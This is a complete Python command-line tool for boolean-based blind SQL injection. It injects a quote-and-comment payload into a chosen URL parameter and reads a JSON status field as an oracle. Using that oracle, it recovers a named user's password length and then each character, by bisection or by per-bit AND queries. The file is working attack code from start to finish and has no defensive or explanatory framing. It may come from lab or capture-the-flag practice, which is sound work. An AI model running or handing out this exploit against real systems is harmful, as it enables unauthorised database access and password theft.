import requests
import json
from urllib.parse import quote_plus
import argparse


# Parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description="SQL injection script with different methods")
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--param', required=True, help='Parameter name')
    parser.add_argument('--target', required=True, help='Target user')
    parser.add_argument('--valid_bool', required=True, help='Value of valid boolean (e.g., "taken")')
    parser.add_argument('--method', required=True, choices=['bisection', 'sql_anding'], help='Method to execute')
    return parser.parse_args()


# Checks if query `q` evaluates as `true` or `false`
def oracle(url, param, target, valid_bool, q):
    p = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(f"{url}?{param}={p}")
    j = json.loads(r.text)
    return j['status'] == valid_bool


# Get the target's password length
def get_password_length(url, param, target, valid_bool):
    length = 0
    while not oracle(url, param, target, valid_bool, f"LEN(password)={length}"):
        length += 1
    print(f"Password length = {length}")
    return length


# Dump the target's password (Bisection method)
def bisection(url, param, target, valid_bool, length):
    password = ""
    for i in range(1, length + 1):
        low = 0
        high = 127
        while low <= high:
            mid = (low + high) // 2
            if oracle(url, param, target, valid_bool, f"ASCII(SUBSTRING(password,{i},1)) BETWEEN {low} AND {mid}"):
                high = mid - 1
            else:
                low = mid + 1
        print(chr(low), end='')
        password += chr(low)
    return password


# Dump the target's password (SQL-Anding method)
def sql_anding(url, param, target, valid_bool, length):
    password = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(url, param, target, valid_bool, f"ASCII(SUBSTRING(password,{i},1))&{2 ** p}>0"):
                c |= 2 ** p
        print(chr(c), end='')
        password += chr(c)
    return password


def main():
    args = parse_args()

    print(f"Target: {args.target}")

    # Get password length
    length = get_password_length(args.url, args.param, args.target, args.valid_bool)

    # Choose method based on user input
    if args.method == 'bisection':
        password = bisection(args.url, args.param, args.target, args.valid_bool, length)
    elif args.method == 'sql_anding':
        password = sql_anding(args.url, args.param, args.target, args.valid_bool, length)

    print(f"\nPassword = {password}")


if __name__ == "__main__":
    main()
